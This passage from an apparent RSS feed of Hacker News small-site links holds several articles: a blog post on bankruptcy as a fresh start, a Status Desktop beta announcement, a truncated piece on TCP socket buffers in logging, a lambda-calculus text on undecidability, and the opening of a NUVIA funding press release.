<p>If you feel like declaring bankruptcy is a failure, stop that. It‚Äôs not a failure. It‚Äôs a fresh start. It‚Äôs a powerful tool and we should take advantage of it. It‚Äôs a weight lifted. </p>



<p>If your washing machine breaks, you can spend hours and hours learning how to fix the stupid thing, or you can toss it and buy a new one. Buying a new one is nothing to be ashamed of. It‚Äôs practical. You‚Äôre declaring dryer bankruptcy (I know the metaphor is a stretch, shut up).</p>



<p>Sure, if you declare bankruptcy on the same thing over and over, then you should examine your patterns about that thing. Bankruptcy is a voice that says ‚Äúwhat can you do to make it unnecessary to do this again?‚Äù </p>



<p>Try it. Declare bankruptcy and <a href="https://twitter.com/mcrittenden">come tell me</a> if you don‚Äôt feel ten times better afterwards.</p>

		</div><!-- .entry-content -->

	</div><!-- .post-inner -->

	<!-- .section-inner -->

	
	<!-- .pagination-single -->

	
</article><!-- .post -->

</div></div>]]>
            </description>
            <link>https://critter.blog/2020/09/24/declare-bankruptcy-and-dont-be-ashamed-of-it/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578858</guid>
            <pubDate>Thu, 24 Sep 2020 14:22:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Re-Introducing Status Desktop ‚Äì Beta v0.1.0. Available on Windows, Mac, Linux]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578847">thread link</a>) | @jonnyz
<br/>
September 24, 2020 | https://our.status.im/re-introducing-status-desktop-beta-v0-1-0/ | <a href="https://web.archive.org/web/*/https://our.status.im/re-introducing-status-desktop-beta-v0-1-0/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
                <div>
                    <div>
                        <div>
                            <p><em>Status Desktop returns as beta v0.1.0 to provide private, secure communication on Mac, Windows, and Linux.</em></p><p>Some may have remembered the moment in <a href="https://twitter.com/ethstatus/status/1058303254600261635">November 2018 at DevconIV</a>, when Status officially pulled the plug on the core contributor Slack and migrated entirely over to Status Desktop alpha. It was a massive moment for Status and the mission to provide private, secure communication no matter where you are ‚Äì on the go with your smartphone or while at work at your desk.</p><p>The conversation in Status Desktop was flowing and the product was improving each day - dogfooding at its finest. However, as many know, building infrastructure and privacy preserving tools from the ground up that adhere to the strict values and principles of the Status community, is challenging to say the least. With that, the team decided to prioritize the Status mobile app and put development of the desktop client on pause. </p><p>Fast forward roughly one year, v1 of the Status mobile app is live in the <a href="https://status.im/get/">App and Playstore</a>, and development of desktop is back underway driven by a dedicated team. </p><p>Today, Status officially re-introduces the Desktop client as beta v0.1.0 ‚Äì marking a huge milestone in bringing decentralized messaging no matter where you are. The team, along with community contributors, have been steadily working on the client for the past few months. Developer builds have only been available via the Github repository for the team along with those willing to try out experimental software. With key features implemented and bringing the desktop messenger close to feature parity with the mobile app, it is officially ready for wider testing and can be downloaded for Mac, Windows, and Linux <a href="https://status.im/get/">here</a></p><h3 id="a-focus-on-messaging">A Focus on Messaging</h3><p>While the Status Mobile App provides a holistic experience for communication and access to Ethereum with an integrated private messenger, Ethereum wallet, and Web3 DApp browser, the desktop app focuses initially on the messenger. It includes all the key features of the mobile application including private 1:1 chats, private group chats, community public channels, images in 1:1 and group chats, emoji reactions and more. </p><p>Status Desktop is truly the first desktop messenger built in line with Status Principles. It leverages <a href="https://our.status.im/peer-to-peer-messaging-where-whisper-falls-short-and-waku-picks-up/">Waku</a> for peer-to-peer messaging just like the mobile app. Waku, the fork of the Whisper protocol, aims to deliver the removal of centralized rent seeking intermediaries, decentralization of the network and removal of single points of failure, and censorship resistance.</p><h3 id="limited-wallet-availability">Limited Wallet Availability</h3><p>Desktop includes access to the Status Sticker Market as well as the ability to register and display stateofus.eth ENS usernames which both require SNT. For this reason, the wallet is available but is hidden from the UI unless toggled on under advanced settings (Profile &gt;&gt; Advanced &gt;&gt; Wallet Tab). Status Desktop has not undergone a formal security audit so wallet features are available at the risk of the user. </p><h3 id="web3-dapp-browser-coming-soon">Web3 DApp Browser Coming Soon</h3><p>The Web3 DApp browser is currently removed from the product entirely while the team builds some final features and can then conduct a security audit. Access to DApps is a crucial part of the Status user experience, but only when strong privacy and security guarantees can be made. As always, Status will not cut corners and jeopardize the security of the community. Both the wallet and DApp browser are under active development and a security audit is in the near future. When the browser is enabled, Status will provide a window into the world of Web3 and a communication layer to Ethereum.</p><h3 id="device-syncing-and-importing-accounts">Device Syncing and Importing Accounts</h3><p>Current Status users can import their existing accounts and then easily sync their mobile and desktop apps for a seamless experience across devices. Simply import an account with a seed phrase and then head to the Profile Tab, Device settings, and then pair devices.</p><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/J5K8dFJ3TCI?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p>Install Status Desktop and test it out for <a href="https://status.im/get/">Mac, Windows, or Linux</a>.</p><p><em>**Status Desktop is un-audited, beta software and builds are available for testing. For this reason, upon installation, you will need to drag Status into the applications folder on your desktop and then manually open the app: <strong>right click &gt;&gt; Open</strong></em></p><p><em>Current status of builds:</em></p><!--kg-card-begin: markdown--><ul>
<li>macOS build is signed but not notarized</li>
<li>Windows build is not signed</li>
<li>Linux build is not signed</li>
</ul>
<!--kg-card-end: markdown--><h3 id="features-">Features:</h3><p><u>Account creation:</u></p><ul><li>Import existing accounts</li><li>Device syncing across desktop and mobile devices</li><li>Three word names for pseudonymity</li><li>Local contact names</li></ul><p><u>Messenger:</u></p><ul><li>Waku protocol for p2p messaging</li><li>Private 1:1, Private Group, and Public chats</li><li>Purchasing and sending stickers</li><li>Payments in chat</li><li>Images in 1:1 and group chats</li><li>Stateofus.eth ENS registration + usernames will display and sync across devices</li><li>Emoji reactions</li><li>@ mentions</li><li>Receiving audio messages (not sending yet)</li><li>Notifications</li><li>Offline support</li><li>Supports markdown formatting</li><li>Image unfurling (needs to be activated for privacy)</li></ul><p><u>Wallet:</u></p><ul><li>Hidden from UI by default (must be enabled - Profile &gt;&gt; Advanced &gt;&gt; Wallet Tab)</li><li>Send and receive ERC20 and ERC721 tokens</li><li>Creation of multiple wallet accounts</li><li>Add/remove tokens from list</li></ul><p><u>Web3 Dapp Browser</u></p><ul><li>Unavailable </li></ul><p><u>Miscellaneous</u></p><ul><li>Dark Mode</li><li>Compact mode</li><li>Supports 4k resolution</li></ul><p><u>Available on:</u></p><ul><li>Mac</li><li>Linux</li><li>Windows</li></ul><p>Install Status Desktop and test it out for <a href="https://status.im/get/">Mac, Windows, or Linux</a>.<br></p>
                            
                        </div>
                    </div>
                </div>
            </div>
        </div></div>]]>
            </description>
            <link>https://our.status.im/re-introducing-status-desktop-beta-v0-1-0/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578847</guid>
            <pubDate>Thu, 24 Sep 2020 14:21:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why your application should not be responsible for delivering logs]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578707">thread link</a>) | @jerodsanto
<br/>
September 24, 2020 | https://dev.sweatco.in/centralized-logging-delivery/ | <a href="https://web.archive.org/web/*/https://dev.sweatco.in/centralized-logging-delivery/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p><a href="https://dev.sweatco.in/centralized-logging-solution/">In a previous article</a>, we looked at the overall architecture of our logging system and how it has evolved. In this article we will look at the frequent problems that we have to deal with when interacting with processes on different instances, which we also have to deal with in the process of constructing an ideal logging system. But we will also cover the main topic of our article - <strong>why your application should not be responsible for delivering logs</strong>. </p><p>When transferring data from one host to another host or a program on one instance to a program on another instance, we face with the concept of interprocess communication (<strong>IPC</strong>) in Linux.</p><h2 id="tcp-or-stream-sockets-in-action">TCP or stream-sockets in action</h2><p>In order for one program to transmit a message to another program, an abstraction in the form of <strong><em>ports</em></strong> was invented. Knowing the TCP address of the computer, we know where to send, and knowing the port to which we can send messages, assuming that the program "owning" this port can pick up this data from there. Thus, we abstract from specific program identifiers.</p><p>Another useful abstraction in linux that makes life easier for a programmer is a <strong>file</strong>. A <em>device</em>, a <em>file on a disk</em> or a <em>network</em> - you will always work with the <code>file</code> abstraction. In case of network interaction, you will work with <em><strong>sockets</strong></em> - special "files" intended for exchanging messages on the network.</p><p>There are two types of sockets: <em><strong>stream-socket</strong></em> and <strong><em>datagram-socket</em></strong>.</p><!--kg-card-begin: markdown--><ul>
<li><em>Stream-socket</em> can be represented as <strong>an entry / exit point</strong> of an endless river of bytes (note that the byte sequence, otherwise it will not be a stream).</li>
<li><em>Datagram-socket</em> can be thought of as your personal <strong>mailbox</strong>, which is ready to receive letters or telegrams (a sequential and limited set of bytes), but the number of such messages cannot exceed the size of your mailbox.</li>
</ul>
<!--kg-card-end: markdown--><p>The guarantees that follow from the definition of <em>stream-socket</em> can be provided both at the <em><strong>local level</strong></em> (UNIX domain) and at the <em><strong>network level</strong></em> (IPv4 or IPv6 domain). <em>At the network level</em>, such guarantees are implemented by the TCP or <strong>Transmission Control Protocol</strong>. I would like to focus on the fact that the type of socket is more important here, and not the domain (UNIX or IPv4/IPv6) in which it works.</p><blockquote>A protocol is a standard that describes the format and interaction of data transfer. For example, sending ordinary letters via post office can also be called a transfer protocol - on such letters we need to indicate the sender and recipient in a certain format, and also pay for the sending, etc.</blockquote><p>Having created the <em>stream socket</em> (linux api function <em><strong>socket</strong></em>) and <em>port</em>, we need to somehow "connect" them (linux api function <em><strong>bind</strong></em>), and then we are ready to start receiving messages from the clients that transmit them (linux api function <em><strong>listen</strong></em>).</p><figure><img src="https://dev.sweatco.in/content/images/2020/07/Logging-part1.svg" alt=""></figure><p><em><strong>The Linux API function</strong> is an available C language function that allows you to "officially" perform actions in user space linux using the Linux kernel system resources and services. Interpreted languages such as python and ruby can wrap C language functions in their own libraries and classes, providing greater convenience and development speed with such functions.</em></p><p>After this stage, the <strong>client</strong> can also create a stream socket (linux api function <strong><em>socket</em></strong>) and then connect (linux api function <em><strong>connect</strong></em>).</p><figure><img src="https://dev.sweatco.in/content/images/2020/06/Logging-part2.svg" alt=""></figure><blockquote>Usually, at this point, illustrations or explanations of how the 3-way handshake and further details of establishing a connection between programs begin to appear. But, as a rule, such details become relevant when there are any errors in establishing a connection or in the process of information transfer between the clients.</blockquote><p>After the connection is established, we can start sending messages. But here, our next question awaits - what to do if the message is lost and who guarantees its' delivery? If linux guarantees delivery of a message after it is received from the application, then it needs a <strong>buffer</strong> for the delivery time, in case linux needs to send them again in case of loss. The same is true in the opposite case, when a part of a message comes and the receiving application has not yet managed to process it. Thus, <strong>we need a buffer</strong> for <em>receiving</em> and <em>sending</em> both on the sending side and on the receiving side.</p><figure><img src="https://dev.sweatco.in/content/images/2020/07/Logging-TCP.svg" alt=""></figure><p>In the figure, we see that each client socket creates a buffer for receiving and sending at the Linux level. But a curious developer immediately has a lot of questions:</p><!--kg-card-begin: markdown--><ul>
<li>what is the size of the socket buffer</li>
<li>what happens when the buffer size is exceeded
<ul>
<li>server side</li>
<li>client side</li>
</ul>
</li>
<li>Is the buffer on the listening socket shared, or is it as separate as on the clients?</li>
<li>whether it is necessary to increase the size of such buffers and how large they should be made</li>
</ul>
<!--kg-card-end: markdown--><p>We will conduct an empirical experiment on ruby (yes, best language in the world) and try to find the answers.</p><!--kg-card-begin: html--><a href="https://asciinema.org/a/z4iODpZMeSV1k5S4PGFGRTS5S" target="_blank"><img src="https://asciinema.org/a/z4iODpZMeSV1k5S4PGFGRTS5S.svg"></a><!--kg-card-end: html--><p>In the lower left corner we can see Socket Stat ( <code>ss</code>) for all stream sockets that are connected to port <code>19_019</code> (note also that netstat is showing at the same time). What we can find out when viewing this window:</p><!--kg-card-begin: markdown--><ol>
<li>LISTEN socket <code>*: 19_019</code> in the Send-Q column shows the size of the backlog (the max number of connections waiting to be <strong>accepted</strong> - as we can see from the Recv-Q column, it can accept <code>backlog + 1</code> the number of waiting ESTABLISHED connections). Once again, I want to note that <strong>the connection has already been established</strong> (!) - the client can send messages there (imagine that you were allowed to queue to make an order, but you have not yet made payment)</li>
<li>After connecting the client to the server, we see two ESTABLISHED sockets - the server <code>127.0.0.1:19019 -&gt; 127.0.0.1: 37242</code> and the client <code>127.0.0.1:37242 -&gt; 127.0.0.1: 19019</code> (we are the server and client create on one instance).</li>
<li>The client and server socket have their own Recv and Send buffers</li>
<li>When the Recv buffer overflows on the server, the client buffer holds the rest of the data in the local Send buffer.</li>
</ol>
<!--kg-card-end: markdown--><blockquote>And another important point that I want to focus on is that the data in the buffer belongs to the operating system, and not to our process (!), which means that we will not see memory consumption at the process level until we start taking data from there.</blockquote><p>Let's see what happens to the client when it tries to connect when the queue of connections waiting to be accepted is full</p><!--kg-card-begin: html--><a href="https://asciinema.org/a/jtoePFOPVbyMT3oWK87RWCMQg" target="_blank"><img src="https://asciinema.org/a/jtoePFOPVbyMT3oWK87RWCMQg.svg"></a><!--kg-card-end: html--><p>As we can see, it is blocked and the connection is in the SYN-SENT state (our client application does not know this). After accepting the first socket, we get the first messages from the buffer (!)</p><p>It is important that <code>socket1</code> for a very long time ‚Äúthinks‚Äù that the data <em>has been sent</em>, <strong>although</strong> practically all this time they were in the linux buffer both on the server and on the client (!).</p><p>Is it true that the buffer is <code>981_788</code> bytes? Let's send the message again and see, after picking up the message that is still in the buffer.</p><!--kg-card-begin: html--><a href="https://asciinema.org/a/tx1FI1aZh9DOnldNyqqmvZOxS" target="_blank"><img src="https://asciinema.org/a/tx1FI1aZh9DOnldNyqqmvZOxS.svg"></a><!--kg-card-end: html--><p>After further experiments, we see that the buffer size increased and reached a size of <code>5_901_199</code> bytes. More than <strong>5 MB</strong> is in the linux buffer, which are waiting for their turn to be processed by the application. And if there will be <code>1_000</code> of such connections?</p><p>You can also make sure that if the buffer is empty, the connection is blocked until messages appear in it (here golang developers can recall <code>go-channels</code> - a very similar behavior).</p><p>Thus, we see the following default behavior of tcp in modern linux:</p><!--kg-card-begin: markdown--><ol>
<li>the buffer size automatically increases to a certain limit from the initial level</li>
<li>there is a limit on the number of pending connections</li>
<li>after the buffer is full (no matter how big it is), the sender is blocked, which means that sender don't have an ability to send messages to the server</li>
</ol>
<!--kg-card-end: markdown--><h2 id="tcp-in-logging">TCP in logging</h2><p>This TCP behavior raises server connectivity issues.</p><!--kg-card-begin: markdown--><ul>
<li>How to handle when the clients cannot connect and send logs<br>
If a client ‚Äúreceives‚Äù connection error (as in scenario above), then another chain of questions arises:
<ul>
<li>How long for should a client try to reconnect?</li>
<li>What should a client do if it cannot connect?
<ul>
<li>Do not send logs or</li>
<li>Do not launch / crash the application?</li>
</ul>
</li>
</ul>
</li>
<li>How do we know that our logs are not sent if we do not send them?</li>
</ul>
<!--kg-card-end: markdown--><p>A lot of questions. And all of this led me to an analogy from everyday life that describes the behavior of TCP in this extreme situation.</p><p>Imagine that your car is an analogue of a client socket and you plan to visit your favorite drive thru restaurant. As soon as you left the roadway, you established a connection (established connection, 3-way handshake successful) and got into the backlog queue. When your turn to place an order comes (<em>connection accepted</em>), you begin to exchange messages with the staff ‚Äì your order, your order changes, payment ‚Äì and with their managers if something goes wrong.</p><p>Usually everything is fine, as long as the restaurant copes with the flow of requests, but if the waiting queue is full (backlog queue), then all other connections are built in anticipation of the opportunity to get into the restaurant queue (all cars are on the roadway waiting for the opportunity to drive in).</p><p>If the waiting time in the roadway queue is exceeded and the connection cannot be established, the balancer (in our analogy, this may be the traffic controller at the intersection) can change the route for sending requests to another server (in our analogy, the restaurant).</p><blockquote>As we discussed in the previous article, you can increase the availability of logging by introducing a balancer that can redirect connections to the instance that is less loaded with connections, but then you need at least two such instances, and if you do not have idle hardware waiting, then this triggers additional costs.</blockquote><figure><img src="https://dev.sweatco.in/content/images/2020/05/Logging-Accept-1.png" alt=""><figcaption><a href="https://www.newstalkzb.co.nz/news/national/queue-at-auckland-mcdonalds-store-cause-traffic-jams/">Queue at Auckland McDonalds store cause traffic jams</a></figcaption></figure><p>If you still managed to connect, then as we saw earlier, the client does not know whether the server started processing it or not. What happens when the size of the system socket buffer is exhausted? (you can imagine that all the passengers of the car begin to tell the driver what they want to order). What to do with messages that are waiting to be sent? Create a buffer for sending within the application? How big do it? What to do when it ends? flood?</p><p>In the worst case, your application ‚Ä¶</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dev.sweatco.in/centralized-logging-delivery/">https://dev.sweatco.in/centralized-logging-delivery/</a></em></p>]]>
            </description>
            <link>https://dev.sweatco.in/centralized-logging-delivery/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578707</guid>
            <pubDate>Thu, 24 Sep 2020 14:06:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Limits of Computability]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578658">thread link</a>) | @helmut_brandl
<br/>
September 24, 2020 | https://hbr.github.io/Lambda-Calculus/computability/text.html | <a href="https://web.archive.org/web/*/https://hbr.github.io/Lambda-Calculus/computability/text.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<nav id="TOC" role="doc-toc">
<ul>
<li><a href="#introduction">Introduction</a>
<ul>
<li><a href="#background">Background</a></li>
<li><a href="#barberville">Barberville</a></li>
</ul></li>
<li><a href="#lambda-calculus-basics">Lambda Calculus Basics</a>
<ul>
<li><a href="#lambda-terms">Lambda terms</a></li>
<li><a href="#reduction">Reduction</a></li>
<li><a href="#notation">Notation</a></li>
<li><a href="#booleans">Booleans</a></li>
<li><a href="#pairs">Pairs</a></li>
<li><a href="#church-numerals-and-arithmetics">Church Numerals and Arithmetics</a></li>
</ul></li>
<li><a href="#encoding-of-lambda-terms">Encoding of Lambda Terms</a>
<ul>
<li><a href="#required-functions-for-encoding">Required Functions for Encoding</a></li>
<li><a href="#self-reference">Self Reference</a></li>
<li><a href="#godelchurch-numbering">Godel/Church Numbering</a></li>
</ul></li>
<li><a href="#undecidability">Undecidability</a>
<ul>
<li><a href="#basic-undecidability">Basic Undecidability</a></li>
<li><a href="#undecidability-of-beta-equivalence">Undecidability of Beta Equivalence</a></li>
<li><a href="#undecidability-of-the-halting-problem">Undecidability of the Halting Problem</a></li>
</ul></li>
</ul>
</nav>

<!-- Global site tag (gtag.js) - Google Analytics -->


<p><strong><a href="https://hbr.github.io/Lambda-Calculus/computability/index.html">Up</a></strong></p>

<h2 id="background">Background</h2>
<p>We explore the limits of computability, i.e.&nbsp;the question: <em>Are there functions which cannot be computed?</em></p>
<p>At the turn of the 19th/20th century there was a great optimism regarding this question. Most of the mathematicians thought that every mathematical function must be computable, every mathematical question has to be decidable.</p>
<p>The famous german mathematician David Hilbert formulated a program (today called <em>Hilbert‚Äôs program</em>) to ground all mathematics on axioms and formal proofs and prove that such a system is free of inconsistencies. In such a formal system it should be possible to prove or disprove all mathematical statements. He expressed his belief with his famous sentence</p>
<blockquote>
<p><em>We must know, we will know</em>.</p>
</blockquote>
<p>This optimism had not been restricted to mathematics. It had been present in all science and technology. The Eiffel tower has been build for the world exposition in 1889. A 324 m high steel building representing the power of technology. Albert Einstein published 1905 his theory of relativity and in 1915 his theory of general relativity. Both theories had been verified by various experiments. The Wright brothers invented and flew the first airplane in 1903.</p>
<p>But let‚Äôs go back to mathematics. In 1901 Bertrand Russel discovered a paradox in naive set theory. It has been customary to talk about the set of all sets. Bertrand Russel found out that this leads to the paradoxical</p>
<blockquote>
<p><em>set of all sets which do not contain themself.</em></p>
</blockquote>
<p>Does this unversal set contain itself? If yes, it contains itself and therefore cannot be in the set. If no, it does not contain itself and therefore must contain itself.</p>
<p>In order to avoid such paradoxes which lead to contradictions, Whitehead and Russel published in 1910, 1912 and 1913 the famous <em>Principia Mathematica</em> which provided a foundation for mathematics free of paradoxes.</p>
<p>The young viennese mathematician Kurt Goedel invented a technique called <em>Goedel Numbering</em>. He used this technique to formulate a sentence similar to Russel‚Äôs paradox as a mathematical statement about natural numbers. Such a statement can be expressed in the formalism of Principia Mathematica and therefore can be injected into Principia Mathematica like a Trojan horse. In his famous incompleteness theorem (1931) Goedel demonstrated that paradoxical statements can be injected into all formalisms which are powerful enough to express basic arithmetics.</p>
<p>Imagine the blow to Hilbert‚Äôs program! All formal theories sufficiently powerful are either inconsistent or incomplete.</p>
<p>The positive side of Goedels incompleteness theorem: Paradoxes are not necessarily bad. They are part of the mathematicians toolkit to prove something.</p>
<p>In 1936 Alan Turing and Alonzo Church proved independently that there are undecidable (or uncomputable) problems in mathematics. They basically used the technique of Goedel numbering in their proofs.</p>
<p>In this paper we are going to show that there are functions which cannot be computed in lambda calculus. Note that functions can return a boolean value and a not computable boolean valued function represents an undecidable predicate.</p>
<p>We don‚Äôt use a lot of math here. We continue to express the ideas in programmer‚Äôs terms like we did in <a href="https://hbr.github.io/Lambda-Calculus/lambda2/lambda.html">Programming with Lambda Calculus</a>. Everybody who is able to program functions should be able to follow.</p>
<h2 id="barberville">Barberville</h2>
<p>Nearly all proofs of undecidability use the encoding of some logical paradox. Let‚Äôs review the outline of such proofs using the example of the <em>barber paradox</em>.</p>
<p>Definition:</p>
<blockquote>
<p>A village has the <em>barber</em> property if there is a barber in the village who shaves all the men in the village who do not shave themselves.</p>
</blockquote>
<p>Theorem:</p>
<blockquote>
<p>A village with the barber property does not exist.</p>
</blockquote>
<p>Proof:</p>
<p>Let‚Äôs assume by way of contradiction that such a village exists. Then there is a barber who shaves every man in the village who does not shave himself.</p>
<p>Now there are two possibilities:</p>
<ol type="1">
<li><p>The barber shaves himself: This is not possible because the barber can only shave men who do not shave themselves. Therefore the assumption that the barber shaves himself leads to a contradiction.</p></li>
<li><p>The barber does not shave himself: This is not possible because the barber shaves all the men who do not shave themselves. Therefore the assumption that the barber does not shave himself leads to a contradiction as well.</p></li>
</ol>
<p>The assumption that such a village exists leads to a contradicion. Therefore we have to conclude that a village with the barber property cannot exist.</p>
<p>Note that some kind of self reference is essential in all paradoxes. In order to use this technique to show that some predicates are undecidable in lambda calculus we have to introduce some self referential lambda terms. I.e. we need some lambda terms and encoded versions of them.</p>
<p>In order to do this, we need some techniques. After having the machinery the actual proof is not complicated.</p>

<p>This section summarizes some basic knowledge of lambda calculus which is required to understand the rest of the text.</p>
<p>If the summary is too compressed, then read the text <a href="https://hbr.github.io/Lambda-Calculus/lambda2/lambda.html">Programming with Lambda Calculus</a> which gives more detailed introduction.</p>
<h2 id="lambda-terms">Lambda terms</h2>
<p>A lambda term is either a variable, an application of a function term to a variable term or a lambda abstraction.</p>
<div id="cb1"><pre><code><span id="cb1-1">    t   <span>::=</span>     x           <span>-- variable</span></span>
<span id="cb1-2">        <span>|</span>       (a b)       <span>-- application of 'a' to the argument 'b'</span></span>
<span id="cb1-3">        <span>|</span>       (\ x <span>:=</span> a)  <span>-- abstraction</span></span>
<span id="cb1-4">                   <span>^</span>    <span>^</span> definition term</span>
<span id="cb1-5">                   <span>|</span> bound variable</span></code></pre></div>
<p>where <code>x</code> ranges over an infinite supply <code>x0, x1, x2, ...</code> of variables and <code>a, b, t</code> range over arbitrary lambda terms.</p>
<p>In mathematical texts the abstraction <code>(\x := a)</code> is usually written as <img src="https://latex.codecogs.com/png.latex?%5Ctextstyle%20%5Clambda%20x.%20a" alt="\lambda x. a" title="\lambda x. a">. In this text we prefer an ascii notation in order to be able to write lambda terms more like terms in a functional programming language. However the mathematical notation and the ascii notation denote the same thing.</p>
<p>The name of a bound variable is irrelevant. The names of bound variables can be changed consistently as long as the change does not interfere with variables which are not bound by the same binder. This restriction is necessary, because a renaming must not make a free variable bound.</p>
<p>Bound variable names in lambda calculus have the same character as formal argument names in programming languages.</p>
<p>All functions in lambda calculus have only one argument. This is not a restriction, because the function applied to an argument can return another function which can be applied another argument.</p>
<h2 id="reduction">Reduction</h2>
<p>The lambda term <code>(\ x := exp) a</code> is a reducible expression. The basic reduction step is</p>
<pre><code>    (\ x := exp) a      ~&gt;      exp[x := a]
                        ^
                        read "reduces to"</code></pre>
<p>where <code>exp[x:=a]</code> is the term <code>exp</code> where all free variables in <code>exp</code> have been replaced by the term <code>a</code>. Note that it might be necessary to rename bound variables in <code>exp</code> before doing the substution in such a way that they do not interfere with any free variables in <code>a</code>. This is always possible since we have an infinite supply of variables.</p>
<p>Example:</p>
<pre><code>    ((\ x := (\ y := x)) a) b
    ~&gt; (\ y := x)[x:=a] b
    =  (\ y := a) b
    ~&gt; a[y:=b]
    =  a</code></pre>
<p>Note that the last equality is valid. <code>a</code> must not contain the free variable <code>y</code>. Otherwise we would have been obliged to rename <code>y</code> to a new variable which is not contained in <code>a</code>.</p>
<h2 id="notation">Notation</h2>
<p>In order to avoid excessive brackets we use some conventions.</p>
<ol type="1">
<li><p>Outer brackets can be ommitted.</p></li>
<li><p>Function application associates to the left. I.e. <code>((a b) c) d)</code> can be written as <code>a b c d</code>.</p></li>
<li><p>Functions with more than one argument can be written in a compressed form. I.e. instead of writing <code>\ x := (\y := exp)</code> we can write <code>\ x y := exp</code>.</p></li>
</ol>
<h2 id="booleans">Booleans</h2>
<p>Data types in lambda calculus are represented by functions which <em>do something</em> which is meaningful for the data type.</p>
<p>A boolean term has two values, true and false. We can encode such values in lambda calculus as functions taking two arguments and returning either the first in case of a true value and the second in case of a false value.</p>
<pre><code>    true  := (\ x y := x)
    false := (\ x y := y)</code></pre>
<p>Therefore <code>true a b ~&gt; a</code> and <code>false a b ~&gt; b</code>.</p>
<p>Note that we use the reduction symbol <code>~&gt;</code> in a sloppy manner. <code>t ~&gt; u</code> can mean that <code>t</code> reduces to <code>u</code> in one step or in more steps. In this paper there is no need to distinguish between one step and multistep reduction. In other contexts it might be necessary to use different symbols.</p>
<p>In order to make our notation look more like definitions in a programming language we can write the definitions of <code>true</code> and <code>false</code> as</p>
<pre><code>    true  x y := x
    false y y := y</code></pre>
<p>But remember that definitions are just abbreviations to make the terms more readable. Lambda calculus does not know of any definitions. The corresponding lambda term can always be obtained by expanding the definitions. This is always possible, because no recursive definitions are allowed. Definitions are just abbreviations.</p>
<h2 id="pairs">Pairs</h2>
<p>We can use our notation to define pairs in lambda calculus.</p>
<pre><code>    pair x y f := f x y</code></pre>
<p>If we apply <code>pair</code> only to two arguments <code>pair a b</code> we get a function which expects another argument and then applies the missing argument to the first two arguments. This fact can be used to define the following projections</p>
<pre><code>    first p     :=  p (\ x y := x)
    second p    :=  p (\ x y := y)</code></pre>
<p>The following reduction shows that <code>first</code> behaves as expected extracting the first part of a pair.</p>
<pre><code>    first (pair a b)
    =  first ((\ x y f := f x y) a b)
    ~&gt; first (\ f := f a b)
    =  (\ f := f a b) (\x y := x)
    ~&gt; (f a b)[f:= (\x y := x)]
    =  (\x y := x) a b
    ~&gt; (\ y := x)[x:=a] b
    =  (\ y := a) b
    ~&gt; a[y:=b]
    =  a</code></pre>
<p>Note again that <code>a</code> must not contain <code>y</code>. Otherwise the variable <code>y</code> must be renamed to another variable which ‚Ä¶</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hbr.github.io/Lambda-Calculus/computability/text.html">https://hbr.github.io/Lambda-Calculus/computability/text.html</a></em></p>]]>
            </description>
            <link>https://hbr.github.io/Lambda-Calculus/computability/text.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578658</guid>
            <pubDate>Thu, 24 Sep 2020 14:00:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nuvia Raises $240M Series B Funding]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578646">thread link</a>) | @jamieiles
<br/>
September 24, 2020 | https://nuviainc.com/news/nuvia-raises-240m-series-in-b-funding | <a href="https://web.archive.org/web/*/https://nuviainc.com/news/nuvia-raises-240m-series-in-b-funding">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-layout-label="Post Body" data-type="item" id="item-5f694760bdf79a7585354fb9"><div><div><div data-block-type="2" id="block-415dc546387c027f9e9c"><div><h3><strong>Series B Investment Round to Provide Runway to First Silicon for Orion SoC</strong> </h3><p><strong>Santa Clara, Calif., September 24, 2020</strong> - NUVIA, a leading-edge silicon design company, today announced the close of its Series B funding round, raising $240M.&nbsp; The funding round was led by Mithril Capital in partnership with Sehat Sutardja and Weili Dai (founders of Marvell Technology Group), funds and accounts managed by BlackRock, Fidelity Management &amp; Research Company LLC., and Temasek, with additional participation from Atlantic Bridge, Redline Capital, Capricorn Investment Group, Dell Technologies Capital, Mayfield, Nepenthe LLC and WRVI Capital. The closure of NUVIA‚Äôs Series B round builds on a $53M Series A round, raised in November 2019. NUVIA was founded in February 2019 by John Bruno, Manu Gulati and Gerard Williams, with the vision to create the world‚Äôs leading server processor.</p><p>‚ÄúThe opportunity in front of NUVIA has never been brighter, with an industry that‚Äôs looking for a new way to get the performance needed to power the next generation of cloud and enterprise computing,‚Äù said Gerard Williams III, CEO, NUVIA. ‚ÄúWe‚Äôre very fortunate to have an incredible group of investors behind us as we close Series B and take the next steps in our vision to redefine performance, energy efficiency, scalability, compute density and total cost of ownership within the data center.‚Äù</p><p>NUVIA is building a leading-edge SoC and CPU core, codenamed ‚ÄúOrion‚Äù and ‚ÄúPhoenix,‚Äù that are designed to deliver industry leading performance on real cloud workloads. More details on performance for the Phoenix CPU can be found at <a href="https://nuviainc.com/blog/performancedeliveredanewway"><span>https://nuviainc.com/blog/performancedeliveredanewway</span></a>.</p><p><strong>About NUVIA</strong></p><p>Headquartered in Santa Clara, NUVIA was founded on the promise of reimagining silicon design for high-performance computing environments. The company is focused on building products that blend the best attributes of compute performance, power efficiency and scalability. For more information, please visit<a 